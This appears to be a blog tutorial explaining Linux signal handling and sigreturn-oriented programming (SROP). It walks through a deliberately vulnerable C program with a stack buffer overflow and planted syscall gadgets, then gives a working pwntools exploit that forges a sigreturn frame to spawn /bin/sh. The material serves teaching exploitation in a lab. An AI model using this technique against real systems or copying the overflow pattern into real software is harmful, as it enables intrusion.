---
layout: post
title:  "Sig-Return Oriented Programming Attack (SROP)"
---

This post covers yet another Binary Exploitation attack that is somewhat similar to return-oriented-programming (ROP) to understand how this works, we first need to understand Linux signals. 

### Linux Signals

Each signal has a current disposition that is used to determine 
how a process behaves when it is delivered a signal. The following
is used to specify the default disposition for each signal.

```
- Term : The default action is to terminate the process
- Ign: The default action is to ignore the process	
	
- Core: This is used to ignore the process and dump core
	(core dump file): Some of the signals, their default actions is 
	to terminate and produce a core dump file. This is a file that contains 
	an image of the process memory at the time of termination. This image
	can be used in a debugger to inspect the state of the program at the time 
	that it was terminated. 

- Stop: This is used to stop the process	
- Cont: This is used to continue the process if it is currently stopped
```

A process can therefore change the disposition of a signal using `sigaction()` and 
`signal()`. A signal handler is a user-defined function that is executed when 
a signal occurs and its stack frame is created on the current processes' stack. It is also possible 
to make the signal handler use an alternate stack using the `sigalstack()` syscall 
as described in its man page.


The following are some of the actions that take place during the execution 
of sighandlers _(user defined functions)_. When there is a transition from kernel-mode to user-mode execution _(eg.
return from a syscall)_, the kernel checks if there is a pending 
unblocked signal for which the process has established a signal handler.

If there is a pending signal, the following takes place:

> _(between the time when a signal is generated and when a signal is delivered
	this is where we say that this is a pending signal)._

- [x] The kernel performs the necessary preparatory steps for the 
	execution of the signal handler.

- [x] The signal is remove from the pending signals.

- [x] If the signal was installed via `sigaction()` and the flag `SA_ONSTACK` was set, 
      and an alternate stack is defined using `sigaltstack()` a new stack for the signal 
is then installed in the specified memory region.

- [x] Otherwise, the kernel will construct a frame for the sighandler on our current 
stack and will set the program counter `rip` for the process to 
point to the first instruction of the sighandler function and 
configures the return address for that function to point 
to a piece of user-space code that is called the `signal trampoline`
	
>_This is code that is used to transfer control from the kernel 
back to user mode when a signal that had a handler installed is sent 
to a process (signal trampoline)._

	
- [x] The kernel now passes control back to the user-space and this is 
where execution will start and the sighandler will be called and its code
block executed.
	
- [x] When the signal handler returns, it passes control back to the signal 
trampoline code and this now calls `sigreturn()` a syscall that uses the 
information in the stack frame that was created by the kernel in `(step 1)` to restore
the process back to how it was before the sighandler was called.
	
When `sigreturn()` compeletes, the kernel then transfers control back to the 
userspace and the process now recommenses its execution back to 
the point where it was interrupted by the signal handler.


The following is a quick `c` snippet that is used to showcase how this works. We 
are going to use a signal disposition that will continue after execution. 


```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

void sighandler(int signum){
	puts("This will be called when the sighandler executes");
}

int main(int argc, char **argv){
	struct sigaction act;
	act.sa_handler = &sighandler;
		
	sigaction(SIGCONT, &act, NULL);
	kill(getpid(), SIGCONT);
	
	puts("I will be printed after execution");
	return 0;
}

```

Compiling and running the program, we can view the syscalls during execution using the 
`strace` command, and from below before the `puts()` function is called we can see 
`rt_sigreturn` syscall that returns the function back to where it commenced resulting
to the output `I will be printed after execution`

Using `gdb` you can also set a breakpoint at `ret` opcode of the sighandler function and 
examine the return address. If this was a normal function, the return address would
we a function address, lets say an address somewhere at `main()` but this is a stack 
address, showing evidence that the function returned to a `signal trampoline`.

### Exploitation 

From what we have learned we can therefore use this to our advantage. This attack will 
work by putting a forged `sigcontext struct` on the stack. This is a data structure that is 
initiated by the kernel, when a sighandler is executed and it contains these 
registers, pointers, flags etc.. used for restoration. After creating the forged `sigcontext structure`, we 
overwrite the return address with the location of our syscall gadget `rt_sigreturn()`.

After execution, the process will try to go back to its intial state trusting 
the values from the sigcontext, restoring them and giving us control of the program
(instruction and stack pointer).

The following are some of the conditions for an SROP attack:

- [x] A buffer overlow vulnerablilty, to control the instruction pointer.
- [x] Enough stack space to place `sigcontext struct` that is 128 bytes.
- [x] A syscall gadget to execute `rt_sigreturn` syscall.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

const char *binsh = "/bin/sh"; 

// gcc -o srop srop.c -no-pie -fno-stack-protector (compile flags)

void syscall_function(){
	__asm__("syscall; ret"); // syscall gadget
}

void set_rax(){
	__asm__("movl $0xf, %eax; ret;");
}

int main(void){	
	char buffer[16];
	read(0, buffer, 500); // buffer overflow
	return 0;
}
```

From the above snippet we see that the binary meets all the conditions 
that are required for an srop attack. Its now time for exploitation. We will 
be using a simple python script for this.

1. First we need to locate our `syscall ret` gadget and `mov eax, 0xf` gadget.

```bash
ropper --file srop --search "syscall; ret" && ropper --file srop --search "mov eax, 0xf; ret"
```

2. Second we find our offset located at `24` and using a simple 
python script we write our payload. Python `pwntools` comes coupled with 
a `sigreturnFrame()` that is used to model out `sigcontext struct`.

```python
#! /usr/bin/python3

from pwn import *

filename = "./srop"

io = process(filename)
elf = ELF(filename)
context.clear(arch="amd64")

syscall_ret = 0x401126
mov_eax = 0x401130
binsh = 0x00402004

def exploit():
        payload = b"A"*24 # fill the buffer to saved RIP
        payload += p64(mov_eax)
        payload += p64(syscall_ret) # call rt_sigreturn()

        #construct sigcontext frame and control the values of out registers
        frame = SigreturnFrame(kernel="amd64")
        frame.rax = constants.SYS_execve # set rax to execve syscall
        frame.rdi = binsh # set rdi to /bin/sh
        frame.rip = syscall_ret

        payload += bytes(frame)
        return payload
 
def main():
        io.sendline(exploit())
        io.interactive()

if __name__ == "__main__":
        main()


```

From the above exploit we get a full bash shell. There are more complex ways
to chain `srop` attack but this all depends with your creativity.

### References

- [x] https://amriunix.com/post/sigreturn-oriented-programming-srop/

